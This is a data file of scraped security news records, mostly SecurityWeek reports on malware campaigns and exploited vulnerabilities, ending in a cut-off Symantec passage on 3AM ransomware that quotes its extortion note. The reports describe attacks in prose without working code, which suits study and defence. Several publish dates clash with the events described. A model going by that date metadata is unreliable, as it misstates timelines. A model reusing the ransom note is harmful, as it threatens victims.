{"id":115,"title":"Magnet Goblin Delivers Linux Malware Using One-Day Vulnerabilities - SecurityWeek","publish_date":"2025-07-28","link":"https://www.securityweek.com/magnet-goblin-delivers-linux-malware-using-one-day-vulnerabilities/","clean_text":"A financially motivated threat actor has been targeting one-day vulnerabilities in public-facing services to deploy Linux backdoors, Check Point reports.\nTracked as Magnet Goblin, the adversary was seen quickly adopting one-day vulnerabilities, often in edge devices, and relying on the Nerbian custom malware family to perform nefarious activities.\nMagnet Goblin was seen targeting publicly disclosed vulnerabilities in Ivanti VPNs (CVE-2023-46805, CVE-2024-21887, CVE-2024-21888, and CVE-2024-21893), Magento (CVE-2022-24086), Qlik Sense (CVE-2023-41265, CVE-2023-41266, and CVE-2023-48365), and possibly Apache ActiveMQ.\nAs part of an attack exploiting the recent Ivanti flaws, the threat actor was observed deploying a JavaScript credential stealer called Warpwire, a Linux variant of the NerbianRAT backdoor, and the open source tunneling tool Ligolo.\nThe Warpwire stealer was previously linked to the mass exploitation of Ivanti vulnerabilities, suggesting that multiple threat actors might be using it, Check Point says.\nThe tool was also seen in a 2022 attack against Magento servers, which were used as command-and-control (C&C) servers for the Windows variant of NerbianRAT and for Warpwire.\nMagnet Goblin deployed MiniNerbian, a smaller version of the Linux NerbianRAT backdoor, on the compromised Magento instances.\nAnalysis of Magnet Goblin’s infrastructure also revealed the use of the remote monitoring and management tools (RMM) ScreenConnect and AnyDesk, as well as the targeting of Qlik Sense and Apache ActiveMQ.\nThe Linux variant of NerbianRAT has been used in attacks since 2022, Check Point says.\nOn the infected machines, the malware collects system information and can run various commands, and communicates with the C&C over raw sockets, relying on AES for encryption.\nGiven “the diverse actions available, the backdoor allows for great flexibility for the threat actor to operate at different times and at different levels of complexity.\nThis enables the malware to remain stealthy yet active on the infected machine,” Check Point notes.\nA simplified version of NerbianRAT, MiniNerbian supports command execution, has a small configuration, and uses HTTP for communication with the C&C. The two backdoors share some code, but they appear to be different malware with similar functions. “\nMagnet Goblin, whose campaigns appear to be financially motivated, has been quick to adopt 1-day vulnerabilities to deliver their custom Linux malware, NerbianRAT and MiniNerbian.\nThose tools have operated under the radar as they mostly reside on edge-devices.\nThis is part of an ongoing trend for threat actors to target areas which until now have been left unprotected,” Check Point concludes.\nRelated: Chinese Cyberspies Use New Malware in Ivanti VPN Attacks Related: Redis Servers Targeted With New ‘Migo’ Malware Related: ‘SlashAndGrab’ ScreenConnect Vulnerability Widely Exploited for Malware Delivery","num_sentences":17,"metadata":{"source":"blog","platform":"securityweek","filename":"goblin"}}
{"id":116,"title":"New 'Hadooken' Linux Malware Targets WebLogic Servers - SecurityWeek","publish_date":"2025-07-28","link":"https://www.securityweek.com/new-hadooken-linux-malware-targets-weblogic-servers/","clean_text":"A new Linux malware has been observed targeting Oracle WebLogic servers to deploy additional malware and extract credentials for lateral movement, Aqua Security’s Nautilus research team warns.\nCalled Hadooken, the malware is deployed in attacks that exploit weak passwords for initial access.\nAfter compromising a WebLogic server, the attackers downloaded a shell script and a Python script, meant to fetch and run the malware.\nBoth scripts have the same functionality and their use suggests that the attackers wanted to make sure that Hadooken would be successfully executed on the server: they would both download the malware to a temporary folder and then delete it.\nAqua also discovered that the shell script would iterate through directories containing SSH data, leverage the information to target known servers, move laterally to further spread Hadooken within the organization and its connected environments, and then clear logs.\nUpon execution, the Hadooken malware drops two files: a cryptominer, which is deployed to three paths with three different names, and the Tsunami malware, which is dropped to a temporary folder with a random name.\nAccording to Aqua, while there has been no indication that the attackers were using the Tsunami malware, they could be leveraging it at a later stage in the attack.\nTo achieve persistence, the malware was seen creating multiple cronjobs with different names and various frequencies, and saving the execution script under different cron directories.\nFurther analysis of the attack showed that the Hadooken malware was downloaded from two IP addresses, one registered in Germany and previously associated with TeamTNT and Gang 8220, and another registered in Russia and inactive.\nOn the server active at the first IP address, the security researchers discovered a PowerShell file that distributes the Mallox ransomware to Windows systems. “\nThere are some reports that this IP address is used to disseminate this ransomware, thus we can assume that the threat actor is targeting both Windows endpoints to execute a ransomware attack, and Linux servers to target software often used by big organizations to launch backdoors and cryptominers,” Aqua notes.\nStatic analysis of the Hadooken binary also revealed connections to the Rhombus and NoEscape ransomware families, which could be introduced in attacks targeting Linux servers.\nAqua also discovered over 230,000 internet-connected Weblogic servers, most of which are protected, save from a few hundred Weblogic server administration consoles that “may be exposed to attacks that exploit vulnerabilities and misconfigurations”.\nRelated: ‘CrystalRay’ Expands Arsenal, Hits 1,500 Targets With SSH-Snake and Open Source Tools Related: Recent WebLogic Vulnerability Likely Exploited by Ransomware Operators Related: Cyptojacking Attacks Target Enterprises With NSA-Linked Exploits Related: New Backdoor Targets Linux Servers","num_sentences":14,"metadata":{"source":"blog","platform":"securityweek","filename":"hadooken"}}
{"id":117,"title":"Magento Vulnerability Exploited to Deploy Persistent Backdoor - SecurityWeek","publish_date":"2024-02-28","link":"https://www.securityweek.com/magento-vulnerability-exploited-to-deploy-persistent-backdoor/","clean_text":"Threat actors are exploiting a critical vulnerability in Magento to inject a persistent backdoor into ecommerce websites, cybersecurity firm Sansec reports.\nThe issue, tracked as CVE-2024-20720 (CVSS score of 9.1), is described as an OS command injection flaw leading to arbitrary code execution without user interaction.\nAdobe resolved the critical vulnerability in February 2024 in both Adobe Commerce and Magento, as part of its Tuesday Patch updates.\nHowever, it appears that there are websites that have yet to be updated and remain vulnerable to exploitation.\nAccording to Sansec, threat actors have discovered a clever way to exploit CVE-2024-20720, using a crafted layout template in the database to inject XML code that can reinfect Magento servers even after a manual fix. “\nAttackers combine the Magento layout parser with the beberlei/assert package (installed by default) to execute system commands.\nBecause the layout block is tied to the checkout cart, this command is executed whenever As part of the observed attacks, the backdoor is added to the automatically generated content management system (CMS) controller, ensuring the backdoor is periodically reinjected and providing persistent remote code execution via POST commands.\nThe threat actors have employed the mechanism to inject a fake Stripe payment skimmer and steal payment data from the compromised web stores.\nUsers are advised to update to Magento versions 2.4.6-p4, 2.4.5-p6 or 2.4.4-p7 as soon as possible, and to scan their websites for any signs of a malware infection.\nRelated: Patch Tuesday: Adobe Warns of Critical Flaws in Widely Deployed Software Related: CISA Warns of Attacks Exploiting Adobe Acrobat Vulnerability Related: Vendors Actively Bypass Security Patch for Year-Old Magento Vulnerability","num_sentences":10,"metadata":{"source":"blog","platform":"securityweek","filename":"magento"}}
{"id":118,"title":"Necro Trojan Infects Google Play Apps With Millions of Downloads - SecurityWeek","publish_date":"2025-07-28","link":"https://www.securityweek.com/necro-trojan-infects-google-play-apps-with-millions-of-downloads/","clean_text":"Two applications with a combined download count of roughly 11 million in the official Google Play application store were found infected with the Necro trojan, according to a report from anti-malware vendor Kaspersky.\nA multi-stage loader, Necro was initially discovered in 2019, after it had infected the CamScanner – Phone PDF creator app with more than 100 million downloads in Google Play.\nThe new variant of the malware making the rounds now is distributed through both applications in Google Play and modified versions of popular applications and games available via unofficial sources.\nOne of these apps, Wuta Camera, has been downloaded more than 10 million times, according to Google Play telemetry.\nAnother app, Max Browser, has over 1 million downloads from the official app store.\nThe infected versions of both applications have since been removed from Google Play, Kaspersky said.\nAccording to Kaspersky documentation, the malware has found hidden unofficial mods for Spotify, WhatsApp, and popular games such as Minecraft, Stumble Guys, Car Parking Multiplayer, and Melon Sandbox.\nThe company said Necro’s presence in applications distributed via diverse sources can be explained by the use of an untrusted solution for ad integration by the applications’ developers.\nThe Spotify infected mod contained an SDK intended for integrating several advertising modules, including one that was caught sending device and application information to a command-and-control (C&C) server and receiving a payload hidden in an image.\nThe loader injected within the WhatsApp mod, however, was different, using Google’s Firebase Remote Config cloud service for C&C, but eventually leading to the execution of the same payload.\nIn both cases, the victim devices were infected with a trojan containing numerous characteristics associated with the Necro family, including similar code and functionality, similar payload structure, and the use of a known Necro C&C server. “\nThe variant of Necro discovered by Kaspersky experts can download modules onto infected smartphones that display ads in invisible windows and click on them, download executable files, install third-party applications, and open arbitrary links in invisible WebView windows to execute JavaScript code,” Kaspersky added.\nAdditionally, the malware can subscribe users to paid services, while the modules can redirect internet traffic through victim devices, using them as proxies.\nAccording to Kaspersky, between August 26 and September 15, the trojan was seen targeting tens of thousands of users in Russia, Brazil, Vietnam, Ecuador, and Mexico.\nSecurityWeek has emailed Google for a statement on Necro slipping into Google Play and will update this article as soon as a reply arrives.\nRelated: 1.3 Million Android TV Boxes Infected by Vo1d Malware Related: Meta Warns of Password Stealing Phone Apps Related: 21 Malicious Apps Downloaded 8 Million Times From Google Play","num_sentences":16,"metadata":{"source":"blog","platform":"securityweek","filename":"necro"}}
{"id":119,"title":"Suspicious NuGet Package Harvesting Information From Industrial Systems - SecurityWeek","publish_date":"2024-01-28","link":"https://www.securityweek.com/suspicious-nuget-package-harvesting-information-from-industrial-systems/","clean_text":"A suspicious NuGet package designed to harvest data from industrial systems appears to be targeting developers who use technology from Chinese company Bozhon, ReversingLabs reports.\nNamed SqzrFramework480 and published on the NuGet repository in January 2024, the package is a .NET library responsible for calibrating robotic movement settings, managing and creating GUIs, initializing and configuring machine vision libraries, and more.\nHowever, it can also harvest various types of information from different types of industrial systems, including cameras and robotic arms, can take screenshots, send ping packets, and open sockets for data transfer. “\nNone of those behaviors are resolutely malicious.\nHowever, when taken together, they raise alarms.\nFor example, we can assume that the screenshots that are being taken are sent to the remote server via the open socket.\nThe ping serves as a heartbeat check to see if the exfiltration server is alive,” ReversingLabs notes.\nThe function that takes screenshots, which is not explicitly declared in the code, operates in a continuous loop if successful, capturing the primary screen every minute and sending the information to a remote IP address, via the opened socket.\nAccording to the security firm, however, it is unclear how the function that initializes the entire operation is executed, with one explanation being that “SqzrFramework480.dll has been written as a help library” and the function needs to be explicitly called by the developer using it.\nThe package appears linked to Bozhon Precision Industry Technology Co., Ltd., an industrial and digital equipment manufacturer based in China.\nReversingLabs’ attempts to communicate with the company regarding the package have remained unsuccessful.\nWhile it does believe that the package could be malicious, ReversingLabs does not have a clear explanation to why it was published to NuGet and its actual purpose.\nOn the one hand, it appears to target developers using Bohzon tools, to exfiltrate from the infected system data such as credentials, configuration settings, and proprietary data, by means of screenshots, possibly as part of a supply chain campaign tailored for industrial espionage.\nOn the other hand, the package might have been published to NuGet by a developer or an independent contractor working for Bohzon, with the data harvesting function being designed for administrative or technical purposes.\nDespite its concerns, ReversingLabs says it has not reported SqzrFramework480 to NuGet.\nThe package has been downloaded over 2,400 times since January and remains available for download, but no other packages that could be linked to the campaign have been discovered.\nRelated: Malicious NuGet Packages Abuse MSBuild Integrations for Code Execution Related: Malicious NuGet Packages Used to Target .NET Developers Related: ‘BlazeStealer’ Malware Delivered to Python Developers Looking for Obfuscation Tools","num_sentences":17,"metadata":{"source":"blog","platform":"securityweek","filename":"nuget"}}
{"id":120,"title":"Chrome Update Patches Zero-Day Vulnerabilities Exploited at Pwn2Own - SecurityWeek","publish_date":"2025-07-28","link":"https://www.securityweek.com/chrome-update-patches-zero-day-vulnerabilities-exploited-at-pwn2own/","clean_text":"Google on Tuesday released a Chrome browser security update to address seven vulnerabilities, including four reported by external researchers.\nThe most severe of the externally reported flaws is a use-after-free bug in ANGLE, the open source cross-platform graphics engine used in Chrome and other popular browsers.\nThe issue is tracked as CVE-2024-2883 and Google notes in its advisory that the researcher who discovered the bug has received a $10,000 bug bounty reward.\nAccording to the advisory, the three other defects reported by external researchers are all high-severity vulnerabilities.\nThe first is CVE-2024-2885, a use-after-free issue in Dawn.\nThe remaining two flaws, tracked as CVE-2024-2886 and CVE-2024-2887, are zero-day vulnerabilities that were exploited and reported last week at the Pwn2Own Vancouver 2024 hacking contest.\nNo additional bounty rewards, aside from those earned at the competition, were handed out for these issues.\nCVE-2024-2886, a use-after-free in WebCodecs, was demonstrated by Seunghyun Lee of KAIST Hacking Lab, who exploited two such issues in the browser at the hacking contest and earned a total of $145,000 in rewards.\nCVE-2024-2887 is a Type Confusion bug in WebAssembly, exploited on the first day of Pwn2Own by security researcher Manfred Paul, who earned a $42,500 reward for it.\nPaul also demonstrated Safari and Firefox vulnerabilities at the hacking contest, earning a total of over $200,000 in rewards and winning the competition.\nMozilla was first to release patches for the zero-day demonstrated at Pwn2Own.\nThe latest Chrome iteration is now rolling out as version 123.0.6312.86/.87 for Windows and macOS, and as version 123.0.6312.86 for Linux.\nWhile Google makes no mention of any of these vulnerabilities being exploited in the wild, users are advised to update their browsers as soon as possible.\nRelated: Despite Surge in Zero-Days, Exploit Mitigations Are Working Related: Chrome 123, Firefox 124 Patch Serious Vulnerabilities Related: Chrome 122, Firefox 123 Patch High-Severity Vulnerabilities Related: Chrome’s Standard Safe Browsing Now Has Real-Time URL Protection","num_sentences":14,"metadata":{"source":"blog","platform":"securityweek","filename":"pwn2own"}}
{"id":121,"title":"Malware Upload Attack Hits PyPI Repository - SecurityWeek","publish_date":null,"link":"https://www.securityweek.com/malware-upload-attack-hits-pypi-repository/","clean_text":"Maintainers of the Python Package Index (PyPI) repository were forced to suspend new project creation and new user registration on Thursday to mitigate a worrisome malware upload campaign.\nThe confirmation of the PyPI incident, which has since been resolved, comes as security researchers at Checkmarx warn that multiple malicious Python packages are being pushed via typo-squatting techniques. “\nThis is a multi-stage attack and the malicious payload aimed to steal crypto wallets, sensitive data from browsers (cookies, extensions data, etc..) and various credentials.\nIn addition, the malicious payload employed a persistence mechanism to survive reboots,” Checkmarx said in a research note.\nEarlier this week, the company said it spotted multiple malicious Python packages being uploaded on the Python Package Index (PyPI) and noted that these packages most likely were created using automation tools. “\nThe malicious code is located within each package’s setup.py file, enabling automatic execution upon installation,” Checkmarx explained. “\nUpon execution, the malicious code within the setup.py file attempted to retrieve an additional payload from a remote server.\nThe URL for the payload was dynamically constructed by appending the package name as a query parameter.”\nThe end result is an info-stealer designed to harvest sensitive information from the victim’s machine and a persistence mechanism to ensure it remained active on the compromised system even after the initial execution. “\nThe discovery of these malicious Python packages on PyPI highlights the ongoing nature of cybersecurity threats within the software development ecosystem.\nThis incident is not an isolated case, and similar attacks targeting package repositories and software supply chains are likely to continue,” the company warned.\nRelated: PyPI Packages Found to Expose Thousands of Secrets Related: Malicious macOS PyPI, NPM Packages Targeting macOS Related: PyPI Enforcing 2FA for Project Maintainers to Boost Security Related: Malicious NPM, PyPI Packages Stealing User Information","num_sentences":12,"metadata":{"source":"blog","platform":"securityweek","filename":"pypi"}}
{"id":122,"title":"Windows Zero-Day Exploited by North Korean Hackers in Rootkit Attack - SecurityWeek","publish_date":"2023-08-28","link":"https://www.securityweek.com/windows-zero-day-exploited-by-north-korean-hackers-in-rootkit-attack/","clean_text":"The notorious North Korean threat group known as Lazarus exploited a Windows zero-day vulnerability for privilege escalation in attacks involving a rootkit named FudModule, according to cybersecurity firm Avast.\nThe vulnerability is tracked as CVE-2024-21338 and it was observed by Avast in Lazarus attacks last year.\nThe security company developed a proof-of-concept (PoC) exploit and sent it to Microsoft in August 2023.\nThe flaw was patched by Microsoft with the company’s February 2024 Patch Tuesday updates, but the initial advisory for CVE-2024-21338 did not list it as a zero-day.\nThe tech giant updated its advisory on Wednesday to inform customers that exploitation of the vulnerability has been detected.\nA blog post published by Avast on Wednesday provides a detailed technical description of the vulnerability and how it has been exploited by Lazarus.\nThe vulnerability impacts the ‘appid.sys’ driver associated with Microsoft’s AppLocker security feature.\nBy targeting a vulnerability in a driver that is present on many systems — rather than using a bring your own vulnerable driver (BYOVD) approach — the attacker benefits from a higher degree of stealth. “\nBy exploiting such a vulnerability, the attacker is in a sense living off the land with no need to bring, drop, or load any custom drivers, making it possible for a kernel attack to be truly fileless.\nThis not only evades most detection mechanisms but also enables the attack on systems where driver allowlisting is in place,” Avast explained.\nBy exploiting CVE-2024-21338, Lazarus hackers were able to elevate their privileges on the compromised system and establish a kernel read/write primitive.\nThis enabled them to perform direct kernel object manipulation in an updated version of the FudModule rootkit, which came to light in 2022.\nThe new variant of the rootkit includes several improvements, including to make the malware more stealthy and to attempt to disable the AhnLab V3 Endpoint Security, Windows Defender, CrowdStrike Falcon, and HitmanPro security software.\nThe Lazarus attack observed by Avast also involved the use of a new remote access trojan (RAT), which the company will detail at a later time.\nIt’s not uncommon for North Korean hackers to exploit zero-day vulnerabilities in their attacks.\nRelated: Microsoft Warns of Exploited Exchange Server Zero-Day Related: Windows Zero-Day Exploited in Attacks on Financial Market Traders Related: Windows Zero-Day Exploited in Nokoyawa Ransomware Attacks","num_sentences":16,"metadata":{"source":"blog","platform":"securityweek","filename":"rootkit"}}
{"id":123,"title":"Black Basta, Bl00dy Ransomware Exploiting Recent ScreenConnect Flaws - SecurityWeek","publish_date":"2025-07-28","link":"https://www.securityweek.com/black-basta-bl00dy-ransomware-exploiting-recent-screenconnect-flaws/","clean_text":"More threat actors have started exploiting two recently resolved vulnerabilities in the ConnectWise ScreenConnect remote desktop access software.\nThe issues, tracked as CVE-2024-1709 (CVSS score of 10) and CVE-2024-1708 (CVSS score of 8.4), are described as an authentication bypass flaw and a path traversal bug.\nConnectWise disclosed the security defects on February 19, when it announced patches for them.\nTwo days later, the company updated its advisory to warn of ongoing exploitation. “\nEssentially, a bad actor could mimic the role as system admin, delete all other users and take over the instance,” the company notes in its advisory.\nA proof-of-concept (PoC) exploit targeting the flaws, collectively referred to as SlashAndGrab, was made public last week, and threat actors quickly started exploiting them for malware delivery.\nNow, Trend Micro says that more cybercrime groups have started exploiting the flaws, including the Black Basta and Bl00dy ransomware groups.\nFollowing initial access to vulnerable servers, Black Basta was seen performing reconnaissance, discovery, and elevation of privilege activities, and deploying Cobalt Strike payloads.\nIn addition to searching for members of the ‘domain admin’ group, the attackers also added new accounts to the administrator group and deployed scripts to identify machines that recently connected to the Active Directory environment.\nOther threat actors were also seen deploying Cobalt Strike payloads to the compromised servers, as well as attempting to disable Windows Defenders’ real-time monitoring functionality.\nThe Bl00dy ransomware group was seen exploiting ConnectWise ScreenConnect vulnerabilities in attacks deploying leaked builders from Conti and LockBit.\nThe ransom notes deployed in both cases, however, identify the attackers as the Bl00dy group.\nIn other attacks, Trend Micro observed threat actors exploiting ScreenConnect flaws to deploy the XWorm malware, which provides remote access to the infected systems, can spread across networks, steal data, and fetch additional payloads.\nTrend Micro also observed attacks where threat actors deployed other remote access software, including Atera and Syncro, as well as another instance of ConnectWise.\nConnectWise customers are advised to update to ScreenConnect version 23.9.8 as soon as possible. “\nFollowing our detailed examination of various threat actors exploiting vulnerabilities in ConnectWise ScreenConnect, we emphasize the urgency of updating to the latest version of the software.\nImmediate patching is not just advisable; it is a critical security requirement to protect your systems from these identified threats,” Trend Micro notes.\nRelated: CISA Urges Patching of Cisco ASA Flaw Exploited in Ransomware Attacks Related: Microsoft Warns of Exploited Exchange Server Zero-Day Related: Ivanti Vulnerability Exploited to Deliver New ‘DSLog’ Backdoor","num_sentences":18,"metadata":{"source":"blog","platform":"securityweek","filename":"screenconnect"}}
{"id":124,"title":"Over 100 Organizations Targeted in Recent 'StrelaStealer' Attacks - SecurityWeek","publish_date":"2022-11-28","link":"https://www.securityweek.com/over-100-organizations-targeted-in-recent-strelastealer-attacks/","clean_text":"Over 100 organizations in the US and EU have been targeted in recent large-scale phishing campaigns distributing the information stealer malware known as StrelaStealer, Palo Alto Networks reports.\nFirst documented in November 2022, StrelaStealer harvests credentials from the well-known email clients and sends them to an attacker-controlled command-and-control (C&C) server specified in the malware’s configuration.\nOver the past five months, Palo Alto Networks identified multiple large-scale campaigns carrying attachments deploying the infostealer in the form of a malicious DLL.\nFollowing an initial wave of emails in November 2023, the attackers launched two more in January and February 2024, mostly targeting the same North American and European regions.\nTailored to local languages, the spam messages were mainly sent to organizations in the high-tech sector, with entities across finance, professional and legal services, manufacturing, government, utilities and energy, insurance, and construction targeted as well.\nUnlike earlier StrelaStealer campaigns that featured ISO attachments containing LNK and HTML files designed to fetch the malware from a remote server, the recent attacks involved a ZIP attachment that contained a JScript file designed to drop the final payload in the form of a DLL.\nThe attacks are also characterized by updated obfuscation meant as an anti-analysis technique, and the removal of debugging symbol strings observed in earlier attacks, likely to prevent detection relying on previously generated signatures or patterns.\nThe change in attachment type preference is likely another attempt to prevent association with previous campaigns, as StrelaStealer’s operators remain undeterred in their nefarious activities. “\nStrelaStealer malware is an active email credential stealer that is always evolving.\nWith each new wave of email campaigns, threat actors update both the email attachment, which initiates the infection chain, and the DLL payload itself.\nAttackers do this to evade detection by security vendors,” Palo Alto Networks notes.\nRelated: Ransomware Declines as InfoStealers and AI Threats Gain Ground: IBM X-Force Related: Several Infostealers Using Persistent Cookies to Hijack Google Accounts Related: macOS Info-Stealer Malware ‘MetaStealer’ Targeting Businesses","num_sentences":12,"metadata":{"source":"blog","platform":"securityweek","filename":"strelastealer"}}
{"id":125,"title":"Recent TeamCity Vulnerability Exploited in Ransomware Attacks - SecurityWeek","publish_date":"2025-06-28","link":"https://www.securityweek.com/recent-teamcity-vulnerability-exploited-in-ransomware-attacks/","clean_text":"A TeamCity vulnerability disclosed recently in controversial circumstances is being exploited in ransomware attacks, according to the product’s developer and cybersecurity companies.\nOn March 4, JetBrains, the developer of the TeamCity build management and continuous integration server, announced fixes for CVE-2024-27198 and CVE-2024-27199, two serious authentication bypass vulnerabilities.\nCVE-2024-27198, which has been rated critical, can be exploited by remote, unauthenticated attackers to take complete control of a server by creating a new admin user account or by generating an admin access token.\nRapid7, whose researchers discovered the vulnerabilities, made public details of CVE-2024-27198 and CVE-2024-27199 a few hours after JetBrains announced fixes.\nFull disclosure seems to have occurred due to miscommunication between the two companies.\nRapid7 was concerned that JetBrains would try to silently patch the vulnerabilities and the vendor was concerned that Rapid7 would disclose details too quickly.\nJetBrains informed customers about patches without notifying Rapid7, which decided to immediately disclose details.\nThis led to threat actors beginning to target CVE-2024-27198 shortly after disclosure on March 4.\nBy March 6, LeakIX, a project that scans the web for vulnerable and misconfigured systems, started seeing mass exploitation, with signs of rogue user creation seen in 1,400 instances.\nMore information has now come to light on what attackers are actually doing.\nGuidePoint Security reported on Friday that a ransomware group named BianLian, which has been known to target critical infrastructure, may have exploited CVE-2024-27198 for initial access (it’s possible that the cybercriminals exploited a different TeamCity flaw).\nIn a lengthy blog post published on Monday, JetBrains said many of its customers managed to install the patches before Rapid7 disclosed details and the attacks started, but many did not.\nThe company said it received reports from some customers whose servers had been compromised.\nTwo customers allegedly saw their files being encrypted as part of ransomware attacks.\nOne customer reported that attackers had hacked its TeamCity server and intended on abusing it for DDoS attacks.\nJetBrains blamed Rapid7 for its customers’ systems getting hacked, highlighting that other vulnerabilities found previously in its products were not exploited as commonly or quickly as CVE-2024-27198.\nThreat actors can reverse engineer a patch to create an exploit even if no information is available about the vulnerability, but JetBrains claims that in this case it took steps to make patch analysis more difficult, which would have given its customers more time to install the fixes before malicious exploitation started.\nRelated: Russian Cyberspies Exploiting TeamCity Vulnerability at Scale: Government Agencies Related: Recently Patched TeamCity Vulnerability Exploited to Hack Servers","num_sentences":18,"metadata":{"source":"blog","platform":"securityweek","filename":"teamcity"}}
{"id":126,"title":"'Vultur' Android Malware Gets Extensive Device Interaction Capabilities - SecurityWeek","publish_date":"2021-03-28","link":"https://www.securityweek.com/vultur-android-malware-gets-extensive-device-interaction-capabilities/","clean_text":"The Android banking malware known as Vultur has been updated with new capabilities, allowing operators to interact with the infected devices and modify files, according to a report from security consulting outfit NCC Group.\nVultur was first documented in March 2021, when it stood out for the abuse of the legitimate applications AlphaVNC and ngrok for remotely accessing the VNC server on the victim device, and for automating screen recording and key-logging for credential harvesting.\nThe most recent version of the banking malware, however, packs significantly more capabilities, allowing attackers to control the infected device, prevent applications from running, display custom notifications, bypass lock-screen protections, and download, upload, install, search for, and delete files.\nThe new features, according to the NCC Group report, are mostly related to the remote interaction with the infected device, but the malware continues to rely on AlphaVNC and ngrok for remote access.\nIn addition, Vultur features updated anti-analysis and detection evasion techniques, spreading the malicious code over multiple payloads, modifying legitimate applications, using native code for payload decryption, and relying on AES encryption for command-and-control (C&C) communication.\nThe infection chain starts with a SMS message instructing the victim to call a phone number to resolve a large transaction that they did not authorize.\nDuring the call, a second SMS message that includes a link to a modified McAfee Security package is received.\nThe modified application contains the functionality of the legitimate McAfee Security software, along with the dropper-framework called Brunhilda, which deploys Vultur via three payloads, the last two designed to invoke each other’s functionality.\nThe NCC Group report notes that Brunhilda first registers with its C&C server, which delivers the first payload, designed to obtain Accessibility Service privileges and install the next stage.\nThe second payload contains the AlphaVNC and ngrok setup, while the third, a Dalvik Executable (DEX) file, contains the core backdoor functionality.\nFor remote interaction with the infected device, the malware includes seven new C&C methods, allowing the attackers to perform “clicks, scrolls, swipe gestures, and more”, and 41 new commands related to Firebase Cloud Messaging (FCM), a messaging service provided by Google. “\nThe message sent by the malware operator through FCM can contain a command, which, upon receipt, triggers the execution of corresponding functionality within the malware.\nThis eliminates the need for an ongoing connection with the device,” NCC Group explains.\nThe latest version of Vultur can also prevent the user from interacting with applications on the device, which are defined in a list provided by the attacker. “\nAndroid users are automatically protected against known versions of this malware by Google Play Protect, which is on by default on Android devices with Google Play Services.\nGoogle Play Protect can warn users or block apps known to exhibit malicious behavior, even when those apps come from sources outside of Play,” a Google spokesperson said in an emailed statement. *\nUpdated with statement from Google.\nRelated: VPN Apps on Google Play Turn Android Devices Into Proxies Related: Anatsa Android Trojan Continues to Spread via Google Play Related: Chameleon Android Malware Can Bypass Biometric Security","num_sentences":18,"metadata":{"source":"blog","platform":"securityweek","filename":"vultur"}}
{"id":127,"title":"'WallEscape' Linux Vulnerability Leaks User Passwords - SecurityWeek","publish_date":"2025-07-28","link":"https://www.securityweek.com/wallescape-linux-vulnerability-leaks-user-passwords/","clean_text":"Security researchers are documenting a new vulnerability found in the util-linux core utilities package in Linux systems, warnign that it allows attackers to leak user passwords and modify the clipboard.\nThe security defect, tracked as CVE-2024-28085 and dubbed ‘WallEscape’, impacts the ‘wall’ command of util-linux that fails to filter escape sequences from command line arguments.\nAn attacker could embed escape sequences into crafted messages and send them via the ‘wall’ command, allowing them to leak passwords and modify commands, if specific conditions are met. “\nThis allows unprivileged users to put arbitrary text on other users’ terminals, if mesg is set to y and wall is setgid,” said security researcher Skyler Ferrante.\nFerrante, who is credited with discovering the flaw, said the bug can be exploited to leak user passwords on Ubuntu 22.04 with default configurations, where ‘wall’ is installed with the special setgid permissions and mesg is set to y. Debian Bookworm is also affected, but CentOS and Red Hat products are not. “\nOn Ubuntu 22.04, we have enough control to leak a user’s password by default.\nThe only indication of attack to the user will be an incorrect password prompt when they correctly type their password, along with their password being in their command history,” the researcher explained in a public advisory.\nAccording to Ferrante, the flaw can also leak an unknown command on Ubuntu 22.0 “if a system runs a command when commands are not found, with the unknown command as an argument.”\nIn addition, it can be exploited to change the output of any command. “\nOn other systems that allow wall messages to be sent, an attacker may be able to alter the clipboard of a victim.\nThis works on windows-terminal, but not on gnome-terminal,” the researcher said.\nFerrante, who also provided proof-of-concept (PoC) code, says that the vulnerability can be used to attack sudo or “anywhere the user inputs their password”.\nAn attacker could send an incorrect password message after a user logs in using OpenSSH, for example.\nAccording to a NIST NVD advisory, “there may be plausible scenarios where this leads to account takeover.”\nThe vulnerability was introduced in 2013 and impacts all util-linux releases prior to version 2.40, which includes patches for this bug.\nRelated: Supply Chain Attack: Major Linux Distributions Impacted by XZ Utils Backdoor Related: Android, Linux, Apple Devices Exposed to Bluetooth Keystroke Injection Related: Severe Glibc Vulnerability Impacts Major Linux Distributions","num_sentences":16,"metadata":{"source":"blog","platform":"securityweek","filename":"wallescape"}}
{"id":128,"title":"3AM: New Ransomware Family Used As Fallback in Failed LockBit Attack | Symantec Enterprise Blogs","publish_date":null,"link":"https://www.security.com/threat-intelligence/3am-ransomware-lockbit","clean_text":"3AM: New Ransomware Family Used As Fallback in Failed LockBit Attack Attackers resorted to new ransomware after deployment of LockBit was blocked on targeted network.\nA new ransomware family calling itself 3AM has emerged.\nTo date, the ransomware has only been used in a limited fashion.\nSymantec’s Threat Hunter Team, part of Broadcom, has seen it used in a single attack by a ransomware affiliate that attempted to deploy LockBit on a target’s network and then switched to 3AM when LockBit was blocked.\n3AM is written in Rust and appears to be a completely new malware family.\nThe ransomware attempts to stop multiple services on the infected computer before it begins encrypting files.\nOnce encryption is complete, it attempts to delete Volume Shadow (VSS) copies.\nIt is still unclear whether its authors have any links to known cybercrime organizations.\nAttack Preparation The first suspicious activity from the threat actor involved the use of the gpresult command to dump the policy settings enforced on the computer for a specified user.\nThe attacker also executed various Cobalt Strike components and tried to escalate privileges on the computer using PsExec.\nThe attackers then ran reconnaissance commands such as whoami, netstat, quser, and net share, and tried to enumerate other servers for lateral movement with the quser and net view commands.\nThey also added a new user for persistence and used the Wput tool to exfiltrate the victims’ files to their own FTP server.\nThe attackers first attempted to use the LockBit ransomware but when that was blocked, they resorted to 3AM instead.\nThe use of 3AM was only partially successful.\nThe attackers only managed to deploy it to three machines on the organization's network and it was blocked on two of those three computers.\n3AM Analysis 3AM is so-called because it appends encrypted files with the extension .threeamtime.\nThe ransom note also makes reference to 3AM: Hello. \"\n3 am\" The time of mysticism, isn't it?\nAll your files are mysteriously encrypted, and the systems \"show no signs of life\", the backups disappeared.\nBut we can correct this very quickly and return all your files and operation of the systems to original state.\nAll your attempts to restore data by himself will definitely lead to their damage and the impossibility of recovery.\nWe are not recommended to you to do it on our own!!! (\nor do at your own peril and risk).\nThere is another important point: we stole a fairly large amount of sensitive data from your local network: financial documents; personal information of your employees, customers, partners; work documentation, postal correspondence and much more.\nWe prefer to keep it secret, we have no goal to destroy your business.\nTherefore can be no leakage on our part.\nWe propose to reach an agreement and conclude a deal.\nOtherwise, your data will be sold to DarkNet/DarkWeb.\nOne can only guess how they will be used.\nPlease contact us as soon as possible, using Tor-browser: http://threeam7[REDACTED].onion/recovery Access key: [32 CHARS SPECIFIED BY -k COMMAND LINE PARAMETER] The ransomware is a 64-bit 